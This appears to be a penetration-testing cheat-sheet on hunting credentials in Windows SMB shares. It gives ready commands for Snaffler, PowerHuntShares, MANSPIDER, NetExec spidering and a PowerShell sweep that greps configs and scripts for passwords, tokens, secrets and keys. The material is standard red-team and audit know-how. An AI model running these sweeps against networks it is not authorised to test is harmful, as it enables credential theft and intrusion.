# Credential Hunting in Network Shares

From domain-joined Windows host — Snaffler auto-discovers all accessible shares and flags high-value files by color ({Red} = creds, {Yellow} = interesting):

```cmd
Snaffler.exe -s
Snaffler.exe -s -o snaffler.log -v data
```

Refine: `-u` pulls AD usernames and searches for references to them, `-i <SHARE>` limits to specific shares.

PowerHuntShares — generates HTML report, no domain join required:

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public
```

From Linux — MANSPIDER via Docker, searches file content across SMB shares:

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET> -c 'passw' -u <USER> -p <PASS>
```

NetExec spider — target a specific share, search content by pattern:

```bash
nxc smb <TARGET> -u <USER> -p <PASS> --spider <SHARE> --content --pattern "passw"
```

Manual PowerShell sweep before running heavy tools:

```powershell
Get-ChildItem -Recurse -Include *.ini,*.cfg,*.env,*.ps1,*.bat \\<SERVER>\<SHARE> | Select-String -Pattern "passw|token|secret|key"
```

> [!tip] Hit IT shares first — they're smaller, higher value, and more likely to contain scripts and configs with hardcoded creds than HR or Marketing shares with thousands of documents.